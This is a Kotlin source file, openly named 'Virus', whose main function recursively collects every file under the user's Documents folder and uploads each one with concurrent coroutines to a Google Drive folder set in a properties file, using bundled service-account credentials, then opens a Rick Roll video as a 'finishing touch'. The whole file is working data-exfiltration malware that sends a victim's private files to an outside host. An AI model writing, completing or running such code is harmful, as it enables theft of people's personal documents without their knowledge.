@file:JvmName("Virus")

package virus

import com.google.api.client.googleapis.auth.oauth2.GoogleCredential
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport
import com.google.api.client.http.FileContent
import com.google.api.client.json.jackson2.JacksonFactory
import com.google.api.services.drive.Drive
import com.google.api.services.drive.DriveScopes
import kotlinx.coroutines.experimental.Job
import kotlinx.coroutines.experimental.channels.Channel
import kotlinx.coroutines.experimental.launch
import kotlinx.coroutines.experimental.runBlocking
import java.awt.Desktop
import java.io.File
import java.net.URI
import java.util.*
import javax.activation.MimetypesFileTypeMap
import kotlin.collections.ArrayList
import kotlin.coroutines.experimental.coroutineContext


fun main(args: Array<String>) = runBlocking {
    // load props file
    val props = Properties().apply {
        load(this::class.java.getResourceAsStream("/virus.properties"))
    }

    val serviceFile = props.getProperty("service-file-name")
            ?: throw RuntimeException("Property service-file-name not found")
    val folder = props.getProperty("drive-folder-id")
            ?: throw RuntimeException("Property drive-folder-id not found")
    val numUploaderRoutines = (props["uploader-coroutines"] as? Int) ?: 5

    val documentsFile = File(props.getProperty("folder") ?: System.getProperty("user.home") + File.separator + "Documents")

    // set up a channel. Recursive file tree traversal function (flattenFileTree) will constantly add lots of files to
    // this channel, and coroutines below will upload said files to Google Drive
    val channel = Channel<File>(Channel.UNLIMITED)

    // keep a list around so we can check for completion later
    val uploaders: MutableList<Job> = ArrayList()
    // launch uploader routines
    for (i in 0 until numUploaderRoutines) {
        uploaders.add(launch {
            val credential = GoogleCredential.fromStream(this::class.java.getResourceAsStream("/$serviceFile")).createScoped(DriveScopes.all())
            val drive = Drive.Builder(GoogleNetHttpTransport.newTrustedTransport(), JacksonFactory.getDefaultInstance(), credential).apply {
                applicationName = "Virus"
            }.build()

            val typesMap = MimetypesFileTypeMap()

            log("Connected to Drive API")

            for (file in channel) {
                val metadata = GFile().apply {
                    name = file.name
                    parents = Collections.singletonList(folder)
                }

                val content = FileContent(typesMap.getContentType(file), file)
                drive.files().create(metadata, content).execute()
                log("Uploaded $file")
            }
        })
    }

    launch { flattenFileTree(documentsFile, channel) }.join()

    // once all the traversers are done, close that channel
    channel.close()

    // wait for any straggling uploaders
    for (uploader in uploaders) {
        uploader.join()
    }

    // finishing touch
    Desktop.getDesktop().browse(URI("https://www.youtube.com/watch?v=dQw4w9WgXcQ"))
}

suspend fun flattenFileTree(root: File, outputChannel: Channel<File>) {
    for (file in root.listFiles()) {
        if (file.isDirectory) {
            // launch another coroutine which keeps iterating through, while this one moves on
            launch(coroutineContext) { flattenFileTree(file, outputChannel) }
        } else {
            outputChannel.send(file)
        }
    }
}

fun log(msg: String) = println("[${Thread.currentThread().name}] $msg")

typealias GFile = com.google.api.services.drive.model.File
